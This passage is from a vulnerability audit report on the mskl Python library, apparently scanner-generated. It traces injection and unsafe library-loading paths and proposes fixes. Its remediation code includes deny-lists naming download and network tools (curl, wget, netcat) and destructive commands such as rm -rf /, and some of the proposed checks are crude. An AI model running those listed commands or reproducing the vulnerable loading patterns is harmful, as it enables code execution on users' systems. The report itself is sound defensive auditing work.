**描述**: The _replace_param() function in kernel_modifier.py directly inserts user-controlled value strings into kernel source code lines without any content sanitization. Values are matched against comment markers (tunable:key) and replaced inline, allowing arbitrary code injection.

**漏洞代码** (`mskl/optune/kernel_modifier.py:63-91`)

```python
@staticmethod
def _replace_param(key, val, lines):
    ...
    if line_without_space.endswith("//" + alias_key):
        lines[index] = Replacer._replace_content_for_alias_name(index, line, val)
    ...
    lines[index] = Replacer._replace_content_for_tunable_name(index, line, val)
```

**达成路径**

[IN] val@kernel_modifier.py:63 → [SINK] lines[index]=_replace_content_for_alias_name(index,line,val)@kernel_modifier.py:76 OR lines[index]=_replace_content_for_tunable_name(index,line,val)@kernel_modifier.py:88 → _write_to_file(lines,path)@kernel_modifier.py:58

---

### [cross-module-env-to-lib-load-chain] Cross-Module EnvVar Library Loading Chain - get_cann_path

**严重性**: High | **CWE**: CWE-426 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `mskl/utils/launcher_utils.py:23-38` @ `get_cann_path`
**模块**: utils
**跨模块**: utils → launcher

**描述**: Complete cross-module library loading attack chain: ASCEND_HOME_PATH environment variable flows through utils.get_cann_path() → used in launcher/compiler.py for compilation paths → loaded via ctypes.CDLL in both launcher/driver.py:36 and utils/launcher_utils.py:34. Attacker controlling ASCEND_HOME_PATH can force loading of malicious libmspti.so or libruntime.so, executing arbitrary code at library initialization time.

**漏洞代码** (`mskl/utils/launcher_utils.py:23-38`)

```python
ASCEND_HOME_PATH → get_cann_path() → os.path.join → ctypes.CDLL(libruntime.so) AND ctypes.CDLL(libmspti.so)
```

**达成路径**

[IN] ASCEND_HOME_PATH@Environment → [OUT] get_cann_path()@utils/launcher_utils.py:23 → [IN] check_runtime_impl()@launcher_utils.py:30 → [OUT] ctypes.CDLL(libruntime.so)@launcher_utils.py:34 AND [IN] load_mspti_so()@launcher/driver.py:30 → [OUT] ctypes.CDLL(libmspti.so)@driver.py:36

**验证说明**: 真实漏洞：ASCEND_HOME_PATH环境变量直接流向ctypes.CDLL加载动态库。load_mspti_so()在模块导入时自动执行(driver.py:39)，check_runtime_impl()被KernelBinaryLauncher.code_gen调用。攻击者控制ASCEND_HOME_PATH可加载恶意libruntime.so/libmspti.so，在库初始化时执行任意代码。

---

### [4800ec024e83] arbitrary_library_load - NPULauncher.__call__

**严重性**: High | **CWE**: CWE-114 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/driver.py:103-105` @ `NPULauncher.__call__`
**模块**: launcher

**描述**: User-provided output_bin_path leads to arbitrary .so loading via importlib.util.spec_from_file_location(). Loaded library executes init code with Python process privileges.

**漏洞代码** (`mskl/launcher/driver.py:103-105`)

```python
spec = importlib.util.spec_from_file_location(module_name, self._module)
module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)
```

**达成路径**

output_bin_path(user/build_script)[IN] -> compile() -> CompiledKernel -> NPULauncher(module) -> importlib[SINK]

---

### [0c50c47ebf7c] arbitrary_code_execution - CompiledExecutable._launch

**严重性**: High | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/compiler.py:305` @ `CompiledExecutable._launch`
**模块**: launcher

**描述**: CompiledExecutable._launch() executes arbitrary executable via subprocess.run(). Executable comes from build_script output.

**漏洞代码** (`mskl/launcher/compiler.py:295-305`)

```python
profiling_cmd = kwargs.get('profiling_cmd', None)
cmd = [*profiling_cmd, self._executable_path, *args_str]
res = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
```

**达成路径**

build_script(user)[IN] -> compile_executable() -> CompiledExecutable -> _launch()[SINK]

---

## 5. Medium 漏洞 (3)

### [537487b45c7c] env_driven_library_load - load_mspti_so

**严重性**: Medium | **CWE**: CWE-114 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/driver.py:31-36` @ `load_mspti_so`
**模块**: launcher

**描述**: ASCEND_HOME_PATH environment variable controls libmspti.so loading via ctypes.CDLL(). Attacker controlling env var can load arbitrary library.

**漏洞代码** (`mskl/launcher/driver.py:31-36`)

```python
cann_path = os.getenv('ASCEND_HOME_PATH')
mspti_path = os.path.join(cann_path, 'lib64/libmspti.so')
lib = ctypes.CDLL(mspti_real_path, mode=ctypes.RTLD_GLOBAL)
```

**达成路径**

ASCEND_HOME_PATH(env)[IN] -> os.getenv() -> os.path.join() -> ctypes.CDLL()[SINK]

---

### [6be49eda9d9f] env_driven_library_load - check_runtime_impl

**严重性**: Medium | **CWE**: CWE-114 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/utils/launcher_utils.py:34` @ `check_runtime_impl`
**模块**: launcher

**描述**: ASCEND_HOME_PATH controls libruntime.so loading in check_runtime_impl(). Same risk as load_mspti_so.

**漏洞代码** (`mskl/utils/launcher_utils.py:34`)

```python
runtime_lib = ctypes.CDLL(os.path.join(cann_path, 'lib64/libruntime.so'), mode=ctypes.RTLD_GLOBAL)
```

**达成路径**

ASCEND_HOME_PATH(env)[IN] -> get_cann_path() -> check_runtime_impl() -> ctypes.CDLL()[SINK]

---

### [20d72ec1b15f] command_injection_via_kwargs - CompiledExecutable._launch

**严重性**: Medium | **CWE**: CWE-78 | **置信度**: 60/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/compiler.py:295-305` @ `CompiledExecutable._launch`
**模块**: launcher

**描述**: profiling_cmd from kwargs prepended to subprocess command. If caller passes malicious list, arbitrary commands execute.

**漏洞代码** (`mskl/launcher/compiler.py:295-305`)

```python
profiling_cmd = kwargs.get('profiling_cmd', None)
cmd = [*profiling_cmd, self._executable_path, *args_str]
```

**达成路径**

profiling_cmd(kwargs)[IN] -> _launch() -> cmd construction -> subprocess.run()[SINK]

**验证说明**: CONFIRMED: profiling_cmd from kwargs directly prepended to subprocess command without validation. If caller passes malicious list, arbitrary commands execute. No content validation for profiling_cmd elements. Optional parameter reduces attack surface but vulnerability exists.

---

## 6. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| cross_module | 0 | 2 | 0 | 0 | 2 |
| launcher | 3 | 2 | 3 | 0 | 8 |
| optune | 2 | 3 | 0 | 0 | 5 |
| utils | 0 | 3 | 0 | 0 | 3 |
| **合计** | **5** | **10** | **3** | **0** | **18** |

## 7. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-94 | 5 | 27.8% |
| CWE-78 | 4 | 22.2% |
| CWE-426 | 3 | 16.7% |
| CWE-114 | 3 | 16.7% |
| CWE-94,CWE-78 | 1 | 5.6% |
| CWE-454 | 1 | 5.6% |
| CWE-269 | 1 | 5.6% |

---

## 修复建议

### 优先级 1: 立即修复 (Critical 漏洞)

#### 1. 配置值内容安全验证

**位置**: `mskl/optune/kernel_modifier.py` 和 `mskl/utils/autotune_utils.py`

**修复方案**:
```python
# 在 check_configs() 或 _replace_param() 中添加内容验证
import re

def validate_config_value(key: str, value: Any) -> None:
    """验证配置值内容安全性"""
    if isinstance(value, str):
        # 禁止 C++ 特殊字符
        forbidden_patterns = [
            r'#',           # 预处理指令
            r'//',          # 注释
            r'/\*',         # 多行注释开始
            r'\*/',         # 多行注释结束
            r'\n',          # 换行符
            r';',           # C++ 语句分隔符
            r'"',           # 字符串引号
            r"'",           # 字符引号
            r'\\',          # 转义字符
            r'include',     # #include
            r'system',      # system() 调用
            r'exec',        # exec 相关
        ]
        for pattern in forbidden_patterns:
            if pattern in value or re.search(pattern, value):
                raise ValueError(f"Config value contains forbidden pattern: {pattern}")
        
        # 长度限制
        if len(value) > 256:
            raise ValueError(f"Config value too long: {len(value)} chars")
    
    # 数值范围验证
    elif isinstance(value, (int, float)):
        if abs(value) > 1e15:
            raise ValueError(f"Config value out of range: {value}")
```

#### 2. 环境变量路径白名单

**位置**: `mskl/utils/launcher_utils.py` 和 `mskl/launcher/driver.py`

**修复方案**:
```python
# 在 load_mspti_so() 和 get_cann_path() 中添加路径验证
import hashlib

def validate_cann_path(cann_path: str) -> bool:
    """验证 CANN 路径是否为合法安装路径"""
    # 白名单路径
    ALLOWED_PATHS = [
        "/usr/local/Ascend",
        "/opt/Ascend",
        "/home/Ascend",
    ]
    
    # 验证路径是否在白名单中
    normalized_path = os.path.normpath(cann_path)
    for allowed in ALLOWED_PATHS:
        if normalized_path.startswith(allowed):
            return True
    
    # 验证关键文件存在且具有正确的签名/哈希
    required_files = [
        "lib64/libmspti.so",
        "lib64/libruntime.so",
        "include/acl/acl.h",
    ]
    
    for file in required_files:
        full_path = os.path.join(cann_path, file)
        if not os.path.exists(full_path):
            return False
        # 可选：验证文件哈希
        # expected_hash = get_expected_hash(file)
        # actual_hash = hashlib.sha256(open(full_path, 'rb').read()).hexdigest()
        # if actual_hash != expected_hash:
        #     return False
    
    return True

def get_cann_path() -> str:
    cann_path = os.getenv('ASCEND_HOME_PATH')
    if cann_path is None or not os.path.isdir(cann_path):
        raise Exception('ASCEND_HOME_PATH is invalid')
    if not validate_cann_path(cann_path):
        raise Exception('ASCEND_HOME_PATH not in allowed paths or missing required libraries')
    return cann_path
```

#### 3. 构建脚本安全执行

**位置**: `mskl/launcher/compiler.py`

**修复方案**:
```python
# 在 compile() 和 compile_executable() 中添加安全执行机制
import subprocess
import tempfile
import os

SAFE_COMPILE_OPTIONS = {
    'allowed_commands': ['g++', 'gcc', 'cmake', 'make', 'npu-smi'],
    'timeout': 600,
    'restricted_env': {'PATH': '/usr/bin:/usr/local/bin'},
}

def validate_build_script(script_path: str) -> bool:
    """静态分析构建脚本安全性"""
    with open(script_path, 'r') as f:
        content = f.read()
    
    # 检查危险命令
    dangerous_patterns = [
        r'curl\s', r'wget\s',  # 下载命令
        r'nc\s', r'netcat',    # 网络工具
        r'rm\s+-rf\s+/',       # 删除命令
        r'chmod\s+777',        # 权限修改
        r'echo\s+.*>\s+/',     # 文件写入
        r'eval\s', r'exec\s',  # 动态执行
        r'\$\{.*\}',           # 变量展开（可能危险）
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, content):
            logger.warning(f"Build script contains potentially dangerous pattern: {pattern}")
            # 可选择：阻止执行或要求用户确认
            return False
    
    return True

def compile_safe(build_script: str, ...):
    """安全编译版本"""
    if not validate_build_script(build_script):
        raise Exception("Build script validation failed - contains dangerous patterns")
    
    # 在受限环境中执行
    compile_cmd = ["bash", build_script, ...]
    result = subprocess.run(
        compile_cmd,
        capture_output=True,
        text=True,
        timeout=SAFE_COMPILE_OPTIONS['timeout'],
        env=SAFE_COMPILE_OPTIONS['restricted_env'],
        cwd=tempfile.gettempdir()  # 在临时目录执行
    )
    ...
```

### 优先级 2: 短期修复 (High 漏洞)

#### 1. 动态库加载验证

**修复方案**: 在 `NPULauncher.__call__()` 中验证加载的 .so 文件来源和签名。

#### 2. profiling_cmd 参数验证

**位置**: `mskl/launcher/compiler.py:295`

**修复方案**:
```python
def _launch(self, *args, **kwargs):
    profiling_cmd = kwargs.get('profiling_cmd', None)
    if profiling_cmd is not None:
        # 验证 profiling_cmd 元素
        if not isinstance(profiling_cmd, list):
            raise ValueError("profiling_cmd must be a list")
        for cmd in profiling_cmd:
            if not isinstance(cmd, str):
                raise ValueError("profiling_cmd elements must be strings")
            if cmd.startswith('/') or cmd.startswith('~'):
                raise ValueError(f"profiling_cmd element looks like a path: {cmd}")
```

#### 3. 软链接和所有权检查强化

**位置**: `mskl/utils/safe_check.py`

**修复方案**: 将 `is_soft_link_recusively()` 和 `check_path_permission()` 中的警告改为异常或阻止。

### 优先级 3: 计划修复 (Medium/Low 漏洞)

#### 1. 临时目录安全创建

**位置**: `mskl/optune/tuner.py:409`

**修复方案**: 使用 `tempfile.mkdtemp()` 替代可预测的时间戳命名，使用安全的随机名称生成。

#### 2. 日志敏感信息过滤

**位置**: `mskl/launcher/compiler.py:211` 和 `mskl/optune/tuner.py:304`

**修复方案**: 在记录日志前过滤敏感信息，如完整命令行、文件路径等。

#### 3. importlib 加载路径验证

**位置**: `mskl/launcher/driver.py:103`

**修复方案**: 验证加载的 .so 模块路径是否在预期目录中，检查文件哈希签名。

---

## 附录：漏洞扫描方法

本次扫描使用了以下方法：
- **静态分析**：基于 AST 的代码模式匹配
- **数据流分析**：污点追踪从用户输入到敏感 sink
- **跨模块分析**：LSP 和调用图追踪跨文件数据流
- **安全审计**：人工验证关键漏洞路径

扫描覆盖范围：
- Python 文件：22 个
- 代码行数：约 4500 行
- 模块：launcher, optune, utils

---

**报告生成时间**: 2026-04-21
**扫描工具**: OpenCode Vulnerability Scanner